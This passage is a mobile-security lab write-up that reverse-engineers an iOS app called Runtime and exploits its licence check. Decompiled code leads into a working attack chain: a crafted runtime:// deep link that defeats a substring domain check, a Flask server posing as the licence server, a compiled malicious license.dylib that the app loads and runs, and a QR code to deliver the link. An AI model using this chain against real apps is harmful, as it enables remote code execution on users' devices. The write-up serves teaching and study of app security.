    _swift_bridgeObjectRelease(local_320);
    local_308.unknown = local_d8;
    local_310 = local_d0;
    _swift_bridgeObjectRetain();
    $$outlined_destroy_of_Swift.DefaultStringInterpolation((int)local_318);
    SVar17 = Swift::String::init(local_308);
    local_300 = SVar17.bridgeObject;
    Foundation::URL::$init();
    _swift_bridgeObjectRelease(local_300);
    iVar3 = local_1d8;
    (**(code **)(local_1a8 + 0x30))(local_1d8,1,local_1b0);
    pSVar1 = local_200;
    if ((sdword)iVar3 == 1) {
      $$outlined_destroy_of_Foundation.URL?(local_1d8);
      local_370 = Swift::String::init("Invalid URL",0xb,1);
      dVar15 = (double)$showToast();
      showToast(dVar15,local_370.str,(int)local_370.bridgeObject,local_200);
      _swift_bridgeObjectRelease(local_370.bridgeObject);
      _objc_release(local_200);
      return;
    }
    iVar3 = local_198;
    (**(code **)(local_1a8 + 0x20))(local_198,local_1d8,local_1b0);
    (**(code **)((*(uint *)pSVar1 & *(uint *)PTR__swift_isaMask_100024630) + 0x58))();
    UVar9.unknown = local_188;
    local_350 = iVar3;
    (**(code **)(local_1a8 + 0x10))(local_188,local_198,local_1b0);
    local_358 = Foundation::URL::_bridgeToObjectiveC(UVar9);
    local_340 = *(code **)(local_1a8 + 8);
    (*local_340)(local_188,local_1b0);
    _objc_retain(local_200);
    _objc_retain(local_200);
    _swift_bridgeObjectRetain(local_170);
    puVar6 = &DAT_100024948;
    _swift_allocObject(&DAT_100024948,0x30,7);
    *(SubscribeController **)(puVar6 + 0x10) = local_200;
    *(SubscribeController **)(puVar6 + 0x18) = local_200;
    *(undefined8 *)(puVar6 + 0x20) = local_168;
    *(undefined8 *)(puVar6 + 0x28) = local_170;
    local_f8 = 
    $$partial_apply_forwarder_for_closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Er ror?)_->_()_in_Runtime.SubscribeController.verifyLicense(server:_Swift.String,key:_Swift.String) _->_()
    ;
    local_118 = PTR___NSConcreteStackBlock_100024248;
    local_110 = 0x42000000;
    local_10c = 0;
    local_108 = 
    $$reabstraction_thunk_helper_from_@escaping_@callee_guaranteed_@Sendable_(@guaranteed_Foundation .Data?,@guaranteed___C.NSURLResponse?,@guaranteed_Swift.Error?)_->_()_to_@escaping_@callee_unown ed_@convention(block)_@Sendable_(@unowned___C.NSData?,@unowned___C.NSURLResponse?,@unowned___C.N SError?)_->_()
    ;
    local_100 = &_block_descriptor;
    local_f0 = puVar6;
    local_360 = __Block_copy(&local_118);
    _swift_release(local_f0);
    iVar3 = local_350;
    _objc_msgSend(local_350,"dataTaskWithURL:completionHandler:",local_358,local_360);
    _objc_retainAutoreleasedReturnValue();
    local_348 = iVar3;
    __Block_release(local_360);
    _objc_release(local_358);
    _objc_release(local_350);
    local_120 = local_348;
    _objc_msgSend(local_348,"resume");
    _objc_release(local_348);
    (*local_340)(local_198,local_1b0);
  }
  _objc_release(local_200);
  return;
}
```
Also, corresponds to **SubscribeController** class.
Let me explain in deep what this function do.

**Server verification**
Checks if the server has the string “**`mhl.pages.dev`**”, which suggests that it is validating against a specific domain.
If the URL *does not contain this string*, it displays an “**Invalid Server**” error message.

**Buypro detection**
If the **license key** (**`param_3`**) contains the string “**`buypro`**”, *redirect to a purchase URL* (`/payment?license_type=pro`) by *opening it in the browser*.
*Before opening the URL*, check if the device (again) *can open the URL* (`UIApplication canOpenURL:`). If possible, open it with `openURL:`.

**Key Validation**
**Checks if the license key has the regex format** `^[0-9]{4}-[0-9]{4}-[A-Z]{4}$` (Example: “**`1234-5678-ABCD`**”).
If it *does not match*, it displays an error message “**`Invalid license format`**”.

**URL Build**
If the **license key is valid**, it *constructs a verification URL* `http://<server>/health` and converts it to a `Foundation::URL` object.

**HTTP Verification**
A `dataTaskWithURL:completionHandler:` request is made to the **constructed URL**.
The `completionHandler` handles the **HTTP response**, checking **if the key is valid**.

So, in short
- *If it passes all validations*, it makes an HTTP request to `http://<server>/health` to *verify the license*.
- If the **server confirms the license**, the *app considers it valid*.

But now, we need know how **`license.dylib`** is loaded in the app, right?
Here's the code, in this function:
`void $$closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Error?)_->_()_in_Runtime.`
I'll use fragment to explain because is a huge function.

If there is no connection to the server, it displays a “**Cannot connect to host**” error.
```CPP
if (local_208 != 0) {
    local_300 = Swift::String::init("Cannot connect to host while getting license");
    Runtime::showToast(dVar14,local_300.str);
}
```

If the server responds with 401, it displays an authentication failed message.
```CPP
if (iVar3 == 0x191) { // 0x191 == 401 Unauthorized
    local_350 = Swift::String::init("Unable to authenticate to server");
    Runtime::showToast(dVar14,local_350.str);
}
```

Retrieves and verifies the Content-Type of the HTTP response.
```CPP
local_398.unknown = (extension_Foundation)::Swift::Dictionary::$_unconditionallyBridgeFromObjectiveC();
local_150 = Swift::String::init("Content-Type",0xc,1);
Swift::Dictionary::$get_subscript((char)local_3b0,local_398);
```

It ensures that the HTTP code of the response is 200 OK.
```CPP
if (local_44c & 1) {
    local_470 = PTR_$$type_metadata_for_Swift.Int_100024540;
    tVar17 = Swift::$_allocateUninitializedArray(2);
    *(undefined8 *)tVar17.1 = 0x12e; // Expected HTTP status code
    *(undefined8 *)((int)tVar17.1 + 8) = 200;
}
```

**Write the license file to a specific location**.
```CPP
Foundation::Data::$write(local_220,options,local_4c0);
```

Try to **load** the `license.dylib` library **into memory**.
```CPP
local_5d8 = _dlopen(local_1f0,2);
```

**Find and execute the `register_device` function**.
```CPP
_dlsym(local_638,local_200);
(*local_688)();
```

- If **`register_device`** **fails**, it displays “*Device registration failed*”.
- If **successful**, displays “**Upgraded to Pro**”.
```CPP
if (((uint)pcVar7 & 1) == 0) {
    local_6c8 = Swift::String::init("Device registration failed.");
    Runtime::showToast(dVar14,local_6c8.str);
} else {
    local_6b8 = Swift::String::init("Upgraded to Pro. Please wait for a decade before we add pro features");
    Runtime::showToast(dVar14,local_6b8.str);
}
```

Let's exploit that, please.
First, we need **create a local server**, then, we send the request (via URL scheme `runtine://`).
But we need *bypass* the `mhl.pages.dev` verification.
We can just do this request:
`runtime://starttrial?server=<our_server>/runtime?x=mhl.pages.dev&trialKey=1234-5678-ABCD`
The verification checks if **contains** the string, not if the requested server is `mhl.pages.dev` ;)

Now that we know how to cheat validation, let's go to:

- Create a **fake server** that *responds like the original*.
- Serve a malicious `license.dylib` to **execute arbitrary code**.

```python
from flask import Flask, jsonify, request, send_from_directory
import os

app = Flask(__name__)

ROOT_PATH = os.path.dirname(os.path.abspath(__file__))

@app.route('/runtime', methods=['GET', 'POST'])
def handle_runtime():
    query_param = request.args.get('x', default=None)
    
    if query_param:
        if "/health" in query_param:
            return jsonify({"status": "healthy"})
        if "/activate" in query_param:
            return jsonify({"token": "E621E1F8-C36C-495A-93FC-0C247A3E6E5F"})
        if "/download" in query_param:
            response = send_from_directory(directory=ROOT_PATH, path='license.dylib', as_attachment=True)
            response.headers["Content-Type"] = "application/octet-stream"
            return response
    
    return jsonify({"error": "Invalid request"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

Then, `python3 server.py` and we need see that the server is **up**
```bash
 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8080
 * Running on http://192.168.1.75:8080
Press CTRL+C to quit
```

This is our **`license.c`** file.
```C
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>

int register_device(void) {
    FILE *file = fopen("license_pwned.txt", "w");
    if (file) {
        fprintf(file, "Exploited!\n");
        fclose(file);
    }
    return 1;
}
```
We need put the file in the **same** *work directory* that our flask server.

Now, let's compile that
```bash
clang -arch arm64 -dynamiclib -o license.dylib license.c
```

![[runtime2.png]]

Now we just need open browser and then go to
`runtime://starttrial?server=192.168.1.75:8080/runtime?x=mhl.pages.dev&trialKey=1234-5678-ABCD`

(`192.168.1.75` is my local IP)

But, for don't write the whole URL, we can use **qrencode** tool for just scan the URL.
```bash
qrencode "runtime://starttrial?server=192.168.1.75:8080/runtime?x=mhl.pages.dev&trialKey=1234-5678-ABCD" -o QR.png
```
Scan the **`.png`** and then, open the the Runner app.

We got the responses!
```bash
192.168.1.90 - - [20/Feb/2025 20:22:26] "GET /runtime?x=mhl.pages.dev/health HTTP/1.1" 200 -
192.168.1.90 - - [20/Feb/2025 20:22:26] "POST /runtime?x=mhl.pages.dev/activate HTTP/1.1" 200 -
192.168.1.90 - - [20/Feb/2025 20:22:26] "GET /runtime?x=mhl.pages.dev/download HTTP/1.1" 200 -
```

![[runtime3.png]]

So, where the **`.dylib`** file was uploaded and our **`.txt`** file?
We can use objection for that:
With the app running
```bash
objection -g "Runtime" explore
```
![[runtime4.png]]

Then, via SSH we can see in **`Documents`** directory:
![[runtime5.png]]

I hope you found it useful (: